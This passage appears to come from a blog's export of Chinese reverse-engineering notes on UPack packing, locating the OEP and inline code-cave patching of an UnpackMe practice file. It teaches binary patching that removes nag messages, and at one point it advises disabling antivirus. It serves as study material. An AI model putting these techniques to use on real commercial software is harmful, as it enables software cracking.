</p><p>③添加新节区后设置。</p><p>补丁代码较少时，使用方法①，其他情况使用方法②或③。首先尝试方法①，使用PEView查看示例文件的第一个节区（.text）头，如图20-12所示</p><p><img src="https://picbedddd.oss-cn-beijing.aliyuncs.com/2022/03/img/%E7%AC%AC20%E7%AB%A0%20%E2%80%9C%E5%86%85%E5%B5%8C%E8%A1%A5%E4%B8%81%E2%80%9D%E7%BB%83%E4%B9%A0.assets/image-20211215201937093.png" alt="图20-12"></p><p>第一个节区的文件形态与加载到内存中的形态如图20-13所示。</p><p><img src="https://picbedddd.oss-cn-beijing.aliyuncs.com/2022/03/img/%E7%AC%AC20%E7%AB%A0%20%E2%80%9C%E5%86%85%E5%B5%8C%E8%A1%A5%E4%B8%81%E2%80%9D%E7%BB%83%E4%B9%A0.assets/image-20211215202042722.png" alt="图20-13"></p><p>第一个节区（.text）的Size of RAW Data为400, Virtual Size为280。也就是说，第一个节区（在磁盘文件中）的尺寸为400,但是仅有280大小被加载到内存，其余区域（680~800）处于未使用状态，该区域即是要查找的空白区域（NULL-Padding ）。</p><blockquote><p>节区的Virtual Size为280，这并不意味着实际节区的内存大小为280，而要以Section Alignment （以上示例文件为1000 ）的倍数扩展，故实际大小为1000。</p></blockquote><p>使用Hex Editor打开并查看找到的空白区域，如图20-14所示。</p><p><img src="https://picbedddd.oss-cn-beijing.aliyuncs.com/2022/03/img/%E7%AC%AC20%E7%AB%A0%20%E2%80%9C%E5%86%85%E5%B5%8C%E8%A1%A5%E4%B8%81%E2%80%9D%E7%BB%83%E4%B9%A0.assets/image-20211215202325937.png" alt="图20-14"></p><p>从图20-14中可以看到，空白区域（ 680~800 ）全部填充着0（这种区域称为Null-padding区域）。接下来在该区域设置补丁代码（洞穴代码）。</p><blockquote><p>图20-12中还有一个需要注意的是1E4的属性值中添加的IMAGE_SCN_MEM_WRITE（可写属性）。为了在程序中进行解密处理，一定要在节区头添加可写属性，获得相应内存的可写权限（当对无写权限的内存进行“写”操作时，会引发非法访问异常）。对于一个普通的PE文件，其代码节是无写权限的，但是包含上面示例在内的压缩工具、Crypter等文件的代码节都有可写权限，请各位以后分析文件时注意这一点。</p></blockquote><h2 id="20-5-2-制作补丁代码"><a href="#20-5-2-制作补丁代码" class="headerlink" title="20.5.2 制作补丁代码"></a>20.5.2 制作补丁代码</h2><p>再次使用OllyDbg调试示例程序，运行到OEP处（40121E）,如图20-15所示。</p><p><img src="https://picbedddd.oss-cn-beijing.aliyuncs.com/2022/03/img/%E7%AC%AC20%E7%AB%A0%20%E2%80%9C%E5%86%85%E5%B5%8C%E8%A1%A5%E4%B8%81%E2%80%9D%E7%BB%83%E4%B9%A0.assets/image-20211215203346781.png" alt="图20-15"></p><p>前面查找到的空白区域在文件中的偏移为680~800,将其变换为进程VA后为401280~401400（参考图20-13）。从图20-15中也可以看到Null-Padding区域是从401280开始的。接下来，在401280位置处创建“补丁代码”。使用OllyDbg的Assemble（Space）命令与Edit（Ctrl+E）命令进行如下编辑。 图20-16中的汇编代码相当简单。地址40128F与4012A0处的REP MOVSB命令用于修改下面的字符串（因401123、40110A字符串处于解密状态，所以能够正常显示）。 </p><blockquote><p>(401123) “You must patch this NAG!!!”  →  (4012A8) “ReverseCore”</p><p>(40110A) “You must unpack me!!!”，，→ (4012B4) “Unpacked”</p></blockquote><p>然后由图20-16中4012A2地址处的JMP命令跳转到OEP处。至此，补丁代码全部完成。每当补丁代码运行时，进程内存中解密后的字符串（401123,40110A）就会被打补丁。在OllyDbg中保存修改的内容（Copy to executable - All modifications命令）。</p><p><img src="https://picbedddd.oss-cn-beijing.aliyuncs.com/2022/03/img/%E7%AC%AC20%E7%AB%A0%20%E2%80%9C%E5%86%85%E5%B5%8C%E8%A1%A5%E4%B8%81%E2%80%9D%E7%BB%83%E4%B9%A0.assets/image-20211215213258042.png" alt="图20-16"></p><h2 id="20-5-3-执行补丁代码"><a href="#20-5-3-执行补丁代码" class="headerlink" title="20.5.3 执行补丁代码"></a>20.5.3 执行补丁代码</h2><p>“内嵌补丁”技术的最后一步是直接修改文件以运行前面创建的补丁代码（洞穴代码）。修改哪部分好呢？观察前面介绍的代码流，可以发现地址401083处存在JMP OEP（40121E）指令，如图20-17所示。</p><p><img src="https://picbedddd.oss-cn-beijing.aliyuncs.com/2022/03/img/%E7%AC%AC20%E7%AB%A0%20%E2%80%9C%E5%86%85%E5%B5%8C%E8%A1%A5%E4%B8%81%E2%80%9D%E7%BB%83%E4%B9%A0.assets/image-20211215210049017.png" alt="图20-17"></p><p>只要把JMP OEP （40121E）命令更改为JMP洞穴代码（401280）就可以了，即在转到OEP之前先把控制交给洞穴代码，使字符串得以修改。</p><p>这里要注意的是，该区域（401083 ）即是原来的加密区域。由图20-11可知，地址401083属于[A]区域，是使用XOR 7加密的区域（参考代码流）。图20-17是解密后的形式，文件中实际的加密形态如图20-18所示。</p><p><img src="https://picbedddd.oss-cn-beijing.aliyuncs.com/2022/03/img/%E7%AC%AC20%E7%AB%A0%20%E2%80%9C%E5%86%85%E5%B5%8C%E8%A1%A5%E4%B8%81%E2%80%9D%E7%BB%83%E4%B9%A0.assets/image-20211215210437589.png" alt="图20-18"></p><p>从文件偏移看，加密区域只到485,后面的0000并不是加密区域（参考图20-11）。比较图20-17 与20-18可以看到，“EE9106” 通过XOR 7加密后变为“E9 96 01”。补丁代码的地址为401280，如图20-19修改JMP命令语句的指令。</p><p><img src="https://picbedddd.oss-cn-beijing.aliyuncs.com/2022/03/img/%E7%AC%AC20%E7%AB%A0%20%E2%80%9C%E5%86%85%E5%B5%8C%E8%A1%A5%E4%B8%81%E2%80%9D%E7%BB%83%E4%B9%A0.assets/image-20211215213414401.png" alt="图20-19"></p><p>照搬指令（E9 F8 01）写入是不行的，还要考虑解密处理，应该执行完XOR 7命令后再写入。</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">E9</span> XOR <span class="hljs-number">7</span> = EE<br><span class="hljs-attribute">F8</span> XOR <span class="hljs-number">7</span> = FF<br><span class="hljs-attribute">01</span> XOR <span class="hljs-number">7</span> = <span class="hljs-number">06</span><br></code></pre></td></tr></table></figure><p>使用Hex Editor修改如图20-20所示</p><p><img src="https://picbedddd.oss-cn-beijing.aliyuncs.com/2022/03/img/%E7%AC%AC20%E7%AB%A0%20%E2%80%9C%E5%86%85%E5%B5%8C%E8%A1%A5%E4%B8%81%E2%80%9D%E7%BB%83%E4%B9%A0.assets/image-20211215215518137.png" alt="图20-20"></p><p>像这样，使用内嵌补丁技术完成了对整个程序的修改工作（以Unpackme#1.aC_patched.exe文件名保存）。</p><h2 id="20-5-4-结果确认"><a href="#20-5-4-结果确认" class="headerlink" title="20.5.4 结果确认"></a>20.5.4 结果确认</h2><p>运行打补丁后的文件（Upackme#1.aC_patched.exe ）,如图20-21所示。</p><p><img src="https://picbedddd.oss-cn-beijing.aliyuncs.com/2022/03/img/%E7%AC%AC20%E7%AB%A0%20%E2%80%9C%E5%86%85%E5%B5%8C%E8%A1%A5%E4%B8%81%E2%80%9D%E7%BB%83%E4%B9%A0.assets/image-20211215215634173.png" alt="image-20211215215634173"></p><p>比较图20-21与图20-2、图20-3,可以看到字符串已经修改成功了，即通过“内嵌补丁”技术成功修改了加密文件。最后，使用调试器查看一下被修改文件的401083地址处。原来为JMP 40121E （ OEP ），现在变为JMP 401280 （洞穴代码）（参考图20-17、图20-22 ）。</p><p><img src="https://picbedddd.oss-cn-beijing.aliyuncs.com/2022/03/img/%E7%AC%AC20%E7%AB%A0%20%E2%80%9C%E5%86%85%E5%B5%8C%E8%A1%A5%E4%B8%81%E2%80%9D%E7%BB%83%E4%B9%A0.assets/image-20211215215809422.png" alt="图20-22"></p><p>如图20-23所示，执行补丁代码（洞穴代码），字符串被修改，最后跳转到OEP处（40121E）。</p><p><img src="https://picbedddd.oss-cn-beijing.aliyuncs.com/2022/03/img/%E7%AC%AC20%E7%AB%A0%20%E2%80%9C%E5%86%85%E5%B5%8C%E8%A1%A5%E4%B8%81%E2%80%9D%E7%BB%83%E4%B9%A0.assets/image-20211215215912028.png" alt="图20-23"></p><p>图20-24显示了被修改的字符串在对话框与消息框中使用的代码。“内嵌补丁”技术本身就是个非常有趣的主题，同时也是能够综合测评代码逆向分析水平（PE文件规范、调试、反汇编等）的好机会。内嵌补丁技术在后面学习API钩取技术时还会用到。</p><p><img src="https://picbedddd.oss-cn-beijing.aliyuncs.com/2022/03/img/%E7%AC%AC20%E7%AB%A0%20%E2%80%9C%E5%86%85%E5%B5%8C%E8%A1%A5%E4%B8%81%E2%80%9D%E7%BB%83%E4%B9%A0.assets/image-20211215220011572.png" alt="图20-24"></p><h1 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h1><p>《逆向工程核心原理》 第20章</p>]]></content>
    
    
    <categories>
      
      <category>Binary</category>
      
      <category>逆向工程核心原理</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Binary</tag>
      
      <tag>逆向工程核心原理</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>UPack调试-查找OEP</title>
    <link href="/1999/02/17/%E9%80%86%E5%90%91%E5%B7%A5%E7%A8%8B%E6%A0%B8%E5%BF%83%E5%8E%9F%E7%90%86/%E7%AC%AC19%E7%AB%A0%20UPack%E8%B0%83%E8%AF%95%20-%20%E6%9F%A5%E6%89%BEOEP/"/>
    <url>/1999/02/17/%E9%80%86%E5%90%91%E5%B7%A5%E7%A8%8B%E6%A0%B8%E5%BF%83%E5%8E%9F%E7%90%86/%E7%AC%AC19%E7%AB%A0%20UPack%E8%B0%83%E8%AF%95%20-%20%E6%9F%A5%E6%89%BEOEP/</url>
    
    <content type="html"><![CDATA[<p>第19章 UPack调试-查找OEP<br>本章将调试UPack压缩的记事本（notepad_upack.exe ）文件以查找OEP。UPack会对PE文件头进行独特变形，但并未应用反调试技术（Anti-Debugging）,调试起来并不费劲。</p><h1 id="19-1-OllyDbg运行错误"><a href="#19-1-OllyDbg运行错误" class="headerlink" title="19.1 OllyDbg运行错误"></a>19.1 OllyDbg运行错误</h1><p>由于UPack会将IMAGE_OPTIONAL_HEADER中的NumberOfRvaAndSizes值设置为八（默认值为10 ），所以使用OllyDbg打开notepad_upack.exe文件时，初始检查过程中会弹出错误消息对话框，如图19-1所示。</p><p><img src="https://picbedddd.oss-cn-beijing.aliyuncs.com/2022/03/img/%E7%AC%AC19%E7%AB%A0%20UPack%E8%B0%83%E8%AF%95%20-%20%E6%9F%A5%E6%89%BEOEP.assets/image-20211215152528702.png" alt="图19-1"></p><p>这不是什么非常严重的错误，按“确认”按钮关闭该对话框。上面这个错误导致OllyDbg无法转到EP位置，停留在ntdll.dll区域，如图19-2所示。</p><p><img src="https://picbedddd.oss-cn-beijing.aliyuncs.com/2022/03/img/%E7%AC%AC19%E7%AB%A0%20UPack%E8%B0%83%E8%AF%95%20-%20%E6%9F%A5%E6%89%BEOEP.assets/image-20211215152603997.png" alt="image-20211215152603997"></p><p>该现象是由OllyDbg的Bug （或者严格的PE检查）引起的，所以需要强制设置EP。首先要查找EP位于何处。下面使用Stud_PE查找EP的虚拟地址。</p><p>如图19-3所示，ImageBase为01000000，EP的RVA为1018，经过计算可知EP的VA值为01001018。在OllyDbg的代码窗口中转到01001018地址处，使用New origin here命令强制更改EIP寄存器中的值，如图19-4所示。</p><p><img src="https://picbedddd.oss-cn-beijing.aliyuncs.com/2022/03/img/%E7%AC%AC19%E7%AB%A0%20UPack%E8%B0%83%E8%AF%95%20-%20%E6%9F%A5%E6%89%BEOEP.assets/image-20211215152828577.png" alt="图19-4"></p><p>执行New origin here命令时会弹出警告消息框，单击“确定”按钮，接下来就可以正常调试了 c</p><h1 id="19-2解码循环"><a href="#19-2解码循环" class="headerlink" title="19.2解码循环"></a>19.2解码循环</h1><p>所有压缩器中都存在解码循环（Decoding Loop ）。如果明白压缩&#x2F;解压算法本身就是由许多条件分支语句和循环构成的，那么可能就会理解为何解码循环看上去如此复杂。</p><p>调试这样的解码循环时，应适当跳过条件分支语句以跳出某个循环。有些情况下循环较为复杂，无法迅速把握。调试中要仔细观察寄存器，注意相应值被写入哪些地址（其实这也需要丰富的经验）。</p><p>UPack把压缩后的数据放到第二个节区，再运行解码循环将这些数据解压缩后放到第一个节区。下面从EP代码开始调试，如图19-5所示</p><p><img src="https://picbedddd.oss-cn-beijing.aliyuncs.com/2022/03/img/%E7%AC%AC19%E7%AB%A0%20UPack%E8%B0%83%E8%AF%95%20-%20%E6%9F%A5%E6%89%BEOEP.assets/image-20211215153233537.png" alt="图19-5"></p><p>前2条指令用于从010011B0地址读取4个字节，然后保存到EAX。EAX拥有值0100739D，它是原本notepad的OEP （分析一下LODS DWORD PTR DS:[ESI]指令可知，该指令从ESI所指的地址处读取4字节存储到EAX寄存器）。事实上，如果事先知道该值是OEP，那么可以直接设置硬件断点，再按F9键运行，就会在OEP处暂停</p><blockquote><p>代码逆向技术入员谈及设置断点后运行时.，常常使用“挂断点跑程序”这样的表达。</p></blockquote><p>我们的目标是提高调试水平，所以继续调试（如果早已熟悉，挂上断点跑程序即可）。经过一阵调试后，会出现图19-6所示的函数调用代码。</p><p><img src="https://picbedddd.oss-cn-beijing.aliyuncs.com/2022/03/img/%E7%AC%AC19%E7%AB%A0%20UPack%E8%B0%83%E8%AF%95%20-%20%E6%9F%A5%E6%89%BEOEP.assets/image-20211215153523115.png" alt="图19-6"></p><p>此时ESI的值为0101FCCB，该地址就是decode()函数的地址，后面会反复调用执行该函数。接下来略看一下decode()函数（101FCCB ），如图19-7所示。</p><p><img src="https://picbedddd.oss-cn-beijing.aliyuncs.com/2022/03/img/%E7%AC%AC19%E7%AB%A0%20UPack%E8%B0%83%E8%AF%95%20-%20%E6%9F%A5%E6%89%BEOEP.assets/image-20211215153719767.png" alt="图19-7"></p><p>仅从这部分来看，还搞不清楚这段代码的用途。使用StepInto（F7）命令继续跟踪调试，遇到图19-8所示的代码。</p><p><img src="https://picbedddd.oss-cn-beijing.aliyuncs.com/2022/03/img/%E7%AC%AC19%E7%AB%A0%20UPack%E8%B0%83%E8%AF%95%20-%20%E6%9F%A5%E6%89%BEOEP.assets/image-20211215154554555.png" alt="图19-8"></p><p>0101FE57与0101FE5D地址处有“向EDI所指位置写入内容”的指令。此时EDI值指向第一个节区中的地址。也就是说，这些命令会先执行解压缩操作，然后写入实际内存。在0101FE5E与 0101FE61地址处通过CMP&#x2F;JB指令继续执行循环，直到EDI值为01014B5A（[ESI+34]&#x3D;01014B5A ）。地址0101FE61即是解码循环的结束部分。实际上，在循环反复执行时跟踪，可以随时看到向EDI所指地址写入了什么值。</p><h1 id="19-3设置-IAT"><a href="#19-3设置-IAT" class="headerlink" title="19.3设置 IAT"></a>19.3设置 IAT</h1><p>一般而言，压缩器执行完解码循环后会根据原文件重新组织IAT。UPack也有类似过程，请看图19-9。</p><p><img src="https://picbedddd.oss-cn-beijing.aliyuncs.com/2022/03/img/%E7%AC%AC19%E7%AB%A0%20UPack%E8%B0%83%E8%AF%95%20-%20%E6%9F%A5%E6%89%BEOEP.assets/image-20211215155423516.png" alt="图19-9"></p><p>如图19-9所示，UPack会使用导入的2个函数（LoadLibraryA与GetProcAddress ）边执行循环边构建原本notepad的IAT （先获取notepad中导入函数的实际内存地址，再写入原IAT区域）。该过程结束后，由0101FEAF地址处的RETN命令将运行转到OEP处，如图19-10所示。</p><p><img src="https://picbedddd.oss-cn-beijing.aliyuncs.com/2022/03/img/%E7%AC%AC19%E7%AB%A0%20UPack%E8%B0%83%E8%AF%95%20-%20%E6%9F%A5%E6%89%BEOEP.assets/image-20211215155652121.png" alt="图19-10"></p><p>各位辛苦了。虽然分析Upack压缩的PE文件头难度比较大，但调试却相对容易得多。希望各位反复翻看这部分内容，不断调试，直到熟练掌握。</p><h1 id="19-4小结"><a href="#19-4小结" class="headerlink" title="19.4小结"></a>19.4小结</h1><p>本章讲解了有关UPackPE文件头分析与调试的内容。除UPack外，还有许多其他压缩器，之所以花费大量的时间与精力分析UPack完全是因为我个入的学习体会（经验）。我学完PE知识后，以为已经完全掌握了PE文件格式的相关知识，但接触UPack后才发现，原 来PE还有另一片新天地。也认识到，PE规范始终只是个规范而已，实际实现会受PE装载器的开发者左右，要针对不同版本的OS实际测试才行。希望各位也能拥有与我类似的经验与感受，所以本章详细讲解了UPack。当然，所讲内容未完全涵盖PE文件头的“打补丁”操作。但是我可以<br>自信地告诉大家：只要征服了UPack，以后不论遇到哪种变形的PE文件头都能应付自如。只要熟练掌握了PE文件头中使用了哪些值、未使用哪些值，就能轻松分析各种变形后的PE文件头（这是我的个人经验）。</p><h1 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h1><p>《逆向工程核心原理》 第19章</p>]]></content>
    
    
    <categories>
      
      <category>Binary</category>
      
      <category>逆向工程核心原理</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Binary</tag>
      
      <tag>逆向工程核心原理</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>第18章 UPack PE文件头详细分析</title>
    <link href="/1999/02/16/%E9%80%86%E5%90%91%E5%B7%A5%E7%A8%8B%E6%A0%B8%E5%BF%83%E5%8E%9F%E7%90%86/%E7%AC%AC18%E7%AB%A0%20UPack%20PE%E6%96%87%E4%BB%B6%E5%A4%B4%E8%AF%A6%E7%BB%86%E5%88%86%E6%9E%90/"/>
    <url>/1999/02/16/%E9%80%86%E5%90%91%E5%B7%A5%E7%A8%8B%E6%A0%B8%E5%BF%83%E5%8E%9F%E7%90%86/%E7%AC%AC18%E7%AB%A0%20UPack%20PE%E6%96%87%E4%BB%B6%E5%A4%B4%E8%AF%A6%E7%BB%86%E5%88%86%E6%9E%90/</url>
    
    <content type="html"><![CDATA[<p>第18章UPack PE文件头详细分析<br>UPack （UltimatePE压缩器）是一款PE文件的运行时压缩器，其特点是用一种非常独特的方式对PE头进行变形。UPack会引起诸多现有PE分析程序错误，因此各制作者（公司）不得不重新修改、调整程序。也就是说，UPack使用了一些划时代的技术方法，详细分析UPack可以把对PE头的认识提升到一个新层次。本章将完全颠覆大家之前对PE头的了解，在学习更多知识的同时，进一步感受代码逆向分析的乐趣与激情。</p><h1 id="18-1-UPack-说明"><a href="#18-1-UPack-说明" class="headerlink" title="18.1 UPack 说明"></a>18.1 UPack 说明</h1><p>UPack是一个名叫dwing的中国入编写的PE压缩器。</p><p>网址：<a href="http://wex.cn/dwing/mycomp.htm">http://wex.cn/dwing/mycomp.htm</a><br>UPack 0.39 Final： <a href="http://wex.cn/dwing/downloadAJpack039.7z">http://wex.cn/dwing/downloadAJpack039.7z</a></p><p>UPack的制作者对PE头有深刻认识，由其对Windows OS PE装载器的详细分析就可以推测出来。许多PE压缩器中，UPack都以对PE头的独特变形技法而闻名。初次查看UPack压缩的文件PE头时，经常会产生“这是什么啊？这能运行吗？”等疑问，其独特的变形技术可窥一斑。</p><p>UPack刚出现时，其对PE头的独特处理使各种PE实用程序（调试器、PE Viewer等）无法正常运行（经常非正常退出）。</p><p>这种特征使许多恶意代码制作者使用UPack压缩自己的恶意代码并发布。由于这样的恶意代码非常多，现在大部分杀毒软件干脆将所有UPack压缩的文件全部识别为恶意文件并删除（还有几个类似的在恶意代码中常用的压缩器）。</p><p>理解下面所有内容后再亲自制作PE Viewer或PE压缩器&#x2F;Crypter，这样就能成为PE文件头的专家了，以后无论PE头如何变形都能轻松分析。</p><blockquote><p>详细分析UPack前要先关闭系统中运行的杀毒软件的实时监控功能（大部分杀毒软件会将UPack识别为病毒并删除），分析完成后再打开。</p></blockquote><h1 id="18-2使用-UPack-压缩-notepad-exe"><a href="#18-2使用-UPack-压缩-notepad-exe" class="headerlink" title="18.2使用 UPack 压缩 notepad.exe"></a>18.2使用 UPack 压缩 notepad.exe</h1><blockquote><p>使用 Windows XP SP3中的 notepad.exe 程序</p></blockquote><p>下面使用UPack 0.39 Final版本压缩notepad.exe。首先将upack.exe与notepad.exe复制到合适的文件中（参考图18-1）,然后在命令行窗口输入命令压缩文件（压缩命令带有几个参数，但这里使用默认（default）参数即可），如图18-2所示。</p><p><img src="https://picbedddd.oss-cn-beijing.aliyuncs.com/2022/03/img/%E7%AC%AC18%E7%AB%A0%20UPack%20PE%E6%96%87%E4%BB%B6%E5%A4%B4%E8%AF%A6%E7%BB%86%E5%88%86%E6%9E%90.assets/image-20211214190930020.png" alt="图18-2"></p><p>UPack会直接压缩源文件本身，且不会另外备份。因此，压缩重要文件前一定要先备份。</p><p>运行时压缩完成后，文件名将变为notepad_upack.exe。接下来使用PEView查看，如图18-3所示。</p><p><img src="https://picbedddd.oss-cn-beijing.aliyuncs.com/2022/03/img/%E7%AC%AC18%E7%AB%A0%20UPack%20PE%E6%96%87%E4%BB%B6%E5%A4%B4%E8%AF%A6%E7%BB%86%E5%88%86%E6%9E%90.assets/image-20211214191914257.png" alt="图18-3"></p><p>这里使用的是PEView的最新版本（0.9.8），但是仍然无法正常读取PE文件头（没有 IMAGE_OPTIONAL HEADER.IMAGE_SECTION_HEADER等的信息）。而在旧版PEView中，程序干脆会非正常终止退岀。</p><h1 id="18-3使用Stud-PE工具"><a href="#18-3使用Stud-PE工具" class="headerlink" title="18.3使用Stud_PE工具"></a>18.3使用Stud_PE工具</h1><p>由于最强大的PE Viewer工具PEView无法正常运行，下面再向各位介绍一款类似的PE实用工具Stud_PE。</p><p>网址：<a href="http://www.cgsoftlabs.ro/">http://www.cgsoftlabs.ro</a><br>Stud PE: <a href="http://www.cgsoftlabs.ro/zip/Stud_PE.zip">http://www.cgsoftlabs.ro/zip/Stud_PE.zip</a></p><p>最新版本为2.6.0.1，在版本2.4.0.1更新说明中有一条针对UPack的说明，如图18-4所示。</p><p><img src="https://picbedddd.oss-cn-beijing.aliyuncs.com/2022/03/img/%E7%AC%AC18%E7%AB%A0%20UPack%20PE%E6%96%87%E4%BB%B6%E5%A4%B4%E8%AF%A6%E7%BB%86%E5%88%86%E6%9E%90.assets/image-20211214192327331.png" alt="图18-4"></p><p>更新说明中指岀，针对Upack的RVA2RAW功能已得到修改（UPack到处制造麻烦）。图18-5是最新版Stud_PE的运行界面。</p><p><img src="https://picbedddd.oss-cn-beijing.aliyuncs.com/2022/03/img/%E7%AC%AC18%E7%AB%A0%20UPack%20PE%E6%96%87%E4%BB%B6%E5%A4%B4%E8%AF%A6%E7%BB%86%E5%88%86%E6%9E%90.assets/image-20211214192623003.png" alt="图18-5"></p><p>Stud_PE的界面结构要比PEView略复杂一些，但它拥有其他工具无法比拟的众多独特优点（也能很好地显示UPack ）。分析UPack文件的PE头时将对Stud_PE进行更加详细的说明。</p><h1 id="18-4比较PE文件头"><a href="#18-4比较PE文件头" class="headerlink" title="18.4比较PE文件头"></a>18.4比较PE文件头</h1><p>先使用Hex Editor打开2个文件（notepad.exe、notepad_upack.exe），再比较其PE头部分。</p><h2 id="18-4-1原-notepad-exe-的-PE-文件头"><a href="#18-4-1原-notepad-exe-的-PE-文件头" class="headerlink" title="18.4.1原 notepad.exe 的 PE 文件头"></a>18.4.1原 notepad.exe 的 PE 文件头</h2><p>图18-6是个典型的PE文件头，其中数据按照IMAGE_DOS_HEADER、DOS Stub、IMAGE_NT_HEADERS、IMAGE_SECTION_HEADER顺序排列。</p><p><img src="https://picbedddd.oss-cn-beijing.aliyuncs.com/2022/03/img/%E7%AC%AC18%E7%AB%A0%20UPack%20PE%E6%96%87%E4%BB%B6%E5%A4%B4%E8%AF%A6%E7%BB%86%E5%88%86%E6%9E%90.assets/image-20211214192944022.png" alt="图18-6"></p><h2 id="18-4-2-notepad-upack-exe运行时压缩的PE文件头"><a href="#18-4-2-notepad-upack-exe运行时压缩的PE文件头" class="headerlink" title="18.4.2 notepad_upack.exe运行时压缩的PE文件头"></a>18.4.2 notepad_upack.exe运行时压缩的PE文件头</h2><p>如图18-7所示，notepad_upx.exe的PE头看上去有些奇怪。MZ与PE签名贴得太近了，并且没有DOS存根，出现了大量字符串，中间好像还夹杂着代码。总之，整个文件不对劲的地方太多了。下面详细分析UPack中使用的这种独特的PE文件头结构。</p><p><img src="https://picbedddd.oss-cn-beijing.aliyuncs.com/2022/03/img/%E7%AC%AC18%E7%AB%A0%20UPack%20PE%E6%96%87%E4%BB%B6%E5%A4%B4%E8%AF%A6%E7%BB%86%E5%88%86%E6%9E%90.assets/image-20211214193000214.png" alt="图18-7"></p><h1 id="18-5分析UPack的PE文件头"><a href="#18-5分析UPack的PE文件头" class="headerlink" title="18.5分析UPack的PE文件头"></a>18.5分析UPack的PE文件头</h1><h2 id="18-5-1-重叠文件头"><a href="#18-5-1-重叠文件头" class="headerlink" title="18.5.1 重叠文件头"></a>18.5.1 重叠文件头</h2><p>重叠文件头也是其他压缩器经常使用的技法，借助该方法可以把MZ文件头（IMAGE_DOS_HEADER ）与PE文件（IMAGE_NT_HEADERS ）巧妙重叠在一起，并可有效节约文件头空间。当然这会额外增加文件头的复杂性，给分析带来很大困难（很难再使用PE相关工具）。</p><p>下面使用Stud_PE看一下MZ文件头部分。请按Headers选项卡的Basic HEADERS tree view in hexeditor按钮，如图18-8所示。</p><p>MZ文件头（IMAGE_DOS_HEADER ）中有以下2个重要成员</p><figure class="highlight livecodeserver"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs livecodeserver">(<span class="hljs-built_in">offset</span>  <span class="hljs-number">0</span>) emagic : Magic <span class="hljs-built_in">number</span> = <span class="hljs-number">4</span>D5A(<span class="hljs-string">&#x27;MZ&#x27;</span>)<br>(<span class="hljs-built_in">offset</span> <span class="hljs-number">3</span>C) e_lfanew : File address <span class="hljs-keyword">of</span> <span class="hljs-built_in">new</span> exe header<br></code></pre></td></tr></table></figure><p>其余成员都不怎么重要（对程序运行没有任何意义）。</p><p>问题在于，根据PE文件格式规范，IMAGE_NT_HEADERS的起始位置是“可变的”。换言之，IMAGE_NT_HEADERS的起始位置由e_lfanew的值决定。一般在一个正常程序中，e_lfanew拥有如下所示的值（不同的构建环境会有不同）。</p><p>e_lfanew &#x3D; MZ文件头大小（40）+ DOS存根大小（可变：VC++下为A0） &#x3D; E0</p><p>UPack中e_lfanew的值为10,这并不违反PE规范，只是钻了规范本身的空子罢了。像这样就<br>可以把MZ文件头与PE文件头重叠在一起。</p><h2 id="18-5-2-IMAGE-FILE-HEADER-SizeOfOptionalHeader"><a href="#18-5-2-IMAGE-FILE-HEADER-SizeOfOptionalHeader" class="headerlink" title="18.5.2 IMAGE_FILE_HEADER.SizeOfOptionalHeader"></a>18.5.2 IMAGE_FILE_HEADER.SizeOfOptionalHeader</h2><p>修改IMAGE_FILE_HEADER.SizeOfOptionalHeader的值，可以向文件头插入解码代码。</p><p>SizeOfOptionalHeader表示PE文件头中紧接在IMAGE_FILE_HEADER下的IMAGE_OPTIONAL_<br>HEADER结构体的长度（E0）。UPack将该值更改为148,如图18-9所示（图中框选的部分）。</p><p><img src="https://picbedddd.oss-cn-beijing.aliyuncs.com/2022/03/img/%E7%AC%AC18%E7%AB%A0%20UPack%20PE%E6%96%87%E4%BB%B6%E5%A4%B4%E8%AF%A6%E7%BB%86%E5%88%86%E6%9E%90.assets/image-20211214195752146.png" alt="图18-9"></p><p>此处会产生一个疑问。由字面意思可知，IMAGE_OPTIONAL_HEADER是结构体，PE32文件格式中其大小已经被确定为E0。</p><p>既然如此，PE文件格式的设计者们为何还要另外输入IMAGE_OPTIONAL_HEADER结构体的大小呢？原来的设计意图是，根据PE文件形态分别更换并插入其他IMAGE_OPTIONAL_HEADER形态的结构体。简言之，由于IMAGE_OPTIONAL_HEADER的种类很多，所以需要另外输入结构体的大小（比如： 64位PE32+的IMAGE_OPTIONAL_HEADER结构体的大小为F0）。</p><p>SizeOfOptionalHeader的另一层含义是确定节区头（IMAGE_SECTION_HEADER ）的起始偏移。</p><p>仅从PE文件头来看，紧接着IMAGE_OPTIONAL_HEADER的好像是IMAGE_SECTION_HEADER。但实际上（更准确地说），从IMAGE_OPTIONAL_HEADER的起始偏移加上SizeOfDptionalHeadeHS后的位置幵始才是IMAGE_SECTION_HEADER。</p><p>UPack把SizeOfOptionalHeader的值设置为148,比正常值（E0或F0）要更大一些。所以IMAGE_SECTION_HEADER是从偏移 170开始的（IMAGE_OPTIONAL_HEADER的起始偏移（28）+SizeOfOptionalHeader（148）&#x3D;170）。</p><p>UPack的意图是什么？为什么要改变这个值（SizeOfOptionalHeader）呢？</p><p>UPack的基本特征就是把PE文件头变形，像扭曲的麻花一样，向文件头适当插入解码需要的代码。增大 SizeOfOptionalHeader 的值后，就在 IMAGE_OPTIONAL_HEADER 与 IMAGE_SECTION_HEADER之间添加了额外空间。UPack就向这个区域添加解码代码，这是一种超越PE文件头常规理解的巧妙方法。</p><p>下面查看一下该区域。IMAGE_OPTIONAL_HEADER结束的位置为D7, IMAGE_SECTION_HEADER的起始位置为170。使用Hex Editor查看中间的区域，如图18-10所示。</p><blockquote><p>补充：在查看时需要注意在Stud_PE中，Optional Header的范围标识并没有DATA_DIR。这里要是基础不牢很容易对D7这个位置产生怀疑</p><p><img src="https://picbedddd.oss-cn-beijing.aliyuncs.com/2022/03/img/%E7%AC%AC18%E7%AB%A0%20UPack%20PE%E6%96%87%E4%BB%B6%E5%A4%B4%E8%AF%A6%E7%BB%86%E5%88%86%E6%9E%90.assets/image-20211214205345372.png" alt="image-20211214205345372"></p></blockquote><p><img 